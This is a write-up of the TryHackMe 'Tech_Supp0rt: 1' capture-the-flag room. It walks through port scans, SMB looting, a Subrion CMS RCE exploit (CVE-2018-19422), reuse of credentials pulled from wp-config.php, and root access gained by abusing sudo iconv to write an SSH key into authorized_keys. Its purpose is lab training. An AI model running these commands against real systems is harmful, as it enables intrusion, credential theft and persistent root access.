# Tech\_Supp0rt: 1

**Room Link:** [https://tryhackme.com/room/techsupp0rt1](https://tryhackme.com/room/techsupp0rt1)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>





### TCP/80 - HTTP

gobuster didn't find anything and the home page was just the default ubuntu page. Couldn't find anything of interest.

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

### TCP/445 - SMB

**Kali**

```
smbclient -L //$VICTIM/
smbclient \\\\$VICTIM\\websvr
smb: \> ls
smb: \> prompt
smb: \> mget *
```

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

I used Cyberchef and it was able to decode the creds

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>



### TCP/80 - HTTP

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>











<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>



I was able to access the subrion page from panel as mentioned in the message as subrion by itself doesn't work. &#x20;

```
Username: admin
Password: Scam2021
```

<figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>



## Shell

**Exploit:** [https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE](https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE)

Since it's using Subrion CMS v4.2.1 I looked for exploits and found one for a rce

```
sudo apt-get install python3-bs4
git clone https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE.git
cd CVE-2018-19422-SubrionCMS-RCE/
sudo python3 SubrionRCE.py -u http://$VICTIM/subrion/panel/ -l admin -p Scam2021
```

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
cat /var/www/html/wordpress/wp-config.php
```

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

The hacker reused the password for both wordpress and ssh.&#x20;

**Kali**

```
ssh scamsite@$VICTIM
Password: ImAScammerLOL!123!
```

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>



### Option #1&#x20;

Just get flag

```
LFILE=/root/root.txt
sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
```





## Privilege Escalation

**Kali**

```
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub 
```

<figure><img src="../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
LFILE=/root/.ssh/authorized_keys
echo "$YOURKEY" | sudo iconv -f 8859_1 -t 8859_1 -o "$LFILE"
```

<figure><img src="../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh root@$VICTIM
```

<figure><img src="../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>







